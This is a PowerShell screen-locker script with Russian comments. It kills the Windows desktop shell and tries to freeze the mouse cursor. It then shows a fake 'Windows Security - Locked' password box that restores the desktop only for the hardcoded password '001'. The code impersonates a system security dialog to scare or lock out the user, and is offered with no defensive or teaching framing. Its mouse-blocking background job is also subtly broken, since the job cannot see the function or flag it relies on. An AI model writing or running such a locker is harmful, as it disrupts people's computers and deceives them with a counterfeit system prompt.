# === ЗАПУСК С БЛОКИРОВКОЙ ===
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic

# Убиваем explorer (рабочий стол + панель задач)
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

$global:Blocked = $true

function Block-Input {
    while ($global:Blocked) {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(10,10)
        Start-Sleep -Milliseconds 10
    }
}

# Запускаем блокировку мыши в фоне
$blockJob = Start-Job -ScriptBlock { Block-Input }

# Окно ввода пароля (блокировка активна во время ввода)
$result = [Microsoft.VisualBasic.Interaction]::InputBox(
    "Введите пароль для разблокировки компьютера:", 
    "Windows Security - Locked", 
    ""
)

if ($result -eq "001") {
    $global:Blocked = $false
    Stop-Job $blockJob
    Remove-Job $blockJob
    
    # Восстанавливаем explorer ТОЛЬКО после верного пароля
    Start-Process explorer.exe
    
    [System.Windows.Forms.MessageBox]::Show("Пароль верный. Компьютер разблокирован.", "Success", "OK", "Information") | Out-Null
} else {
    [System.Windows.Forms.MessageBox]::Show("Неверный пароль! Система остаётся заблокированной.", "Access Denied", "OK", "Error") | Out-Null
    # Блокировка продолжается, explorer не восстанавливается
}
